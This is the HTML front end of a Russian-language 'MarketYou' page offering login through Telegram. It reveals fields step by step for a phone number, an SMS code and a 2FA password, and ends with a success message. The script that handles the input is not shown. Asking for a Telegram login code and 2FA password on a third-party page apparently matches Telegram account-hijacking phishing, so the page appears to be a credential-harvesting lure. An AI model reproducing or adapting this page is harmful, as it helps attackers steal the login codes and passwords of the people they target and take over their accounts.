<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MarketYou - Вход</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>Вход через Telegram</h1>
        </header>
        <main>
            <button id="loginBtn" class="login-btn">Войти</button>
            <div id="authForm" class="auth-form hidden">
                <div class="loading" id="loadingSpinner"></div>
                <input type="tel" id="phoneInput" placeholder="Введите номер телефона" class="input-field hidden">
                <input type="text" id="codeInput" placeholder="SMS-код" class="input-field hidden">
                <input type="password" id="2faInput" placeholder="Пароль 2FA" class="input-field hidden">
                <button id="submitBtn" class="submit-btn hidden">Подтвердить</button>
                <div id="successMsg" class="success hidden">✅ Авторизация успешна!</div>
            </div>
        </main>
    </div>
    <script src="script.js"></script>
</body>

</html>
